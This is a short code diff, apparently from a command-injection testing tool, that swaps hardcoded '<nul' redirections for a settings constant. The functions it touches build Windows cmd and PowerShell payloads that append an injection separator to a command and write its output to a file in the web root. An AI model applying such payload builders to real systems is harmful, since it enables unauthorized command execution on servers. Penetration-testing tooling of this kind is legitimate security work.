@@ -47,7 +47,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
     payload = (separator +
               "for /f \"tokens=*\" %i in ('cmd /c " + 
               python_payload +
-              "') do @set /p = %i <nul"
+              "') do @set /p = %i " + settings.CMD_NUL
               )
   else:
     payload = (separator +
@@ -78,7 +78,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
-              "\")\"') do " + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '%i'" + "<nul"
+              "\")\"') do " + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '%i'" + settings.CMD_NUL
               ) 
   else:
     payload = (separator +
@@ -100,7 +100,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
       payload = (separator +
                 "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
-                "') do @set /p = %i < nul"
+                "') do @set /p = %i " + settings.CMD_NUL
                 )
   else:
     payload = (separator +
